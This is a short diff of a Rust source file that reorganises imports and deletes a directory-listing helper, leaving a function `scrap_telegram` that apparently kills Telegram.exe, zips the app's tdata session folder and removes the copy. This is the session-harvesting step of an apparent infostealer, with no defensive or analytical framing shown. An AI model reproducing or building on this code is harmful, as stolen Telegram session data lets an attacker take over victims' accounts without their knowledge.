@@ -1,8 +1,7 @@
+use crate::system::process::*;
 use std::{fs::{self, File}, io::Write, path::PathBuf, str::FromStr};
-use utils::{get_process_directory, kill_proc_by_name};
-use walkdir::WalkDir;
 use zip::{write::FileOptions, ZipWriter};
-
+use walkdir::WalkDir;
 
 pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, local_path: &PathBuf) -> Result<(), &'static str>{
     let telegram_proc_name = String::from_str("Telegram.exe").unwrap();
@@ -60,14 +59,4 @@ pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, loca
     zip_file.finish().unwrap();
     let _ = fs::remove_dir_all(&tdata_path);
     return Ok(());
-}
-
-pub fn walk_dir(path: &PathBuf){
-    for entry in WalkDir::new(path) {
-        let entry = entry.unwrap();
-        if entry.path().is_dir(){
-            continue;
-        }
-        println!("{}", entry.path().display());
-    }
 }
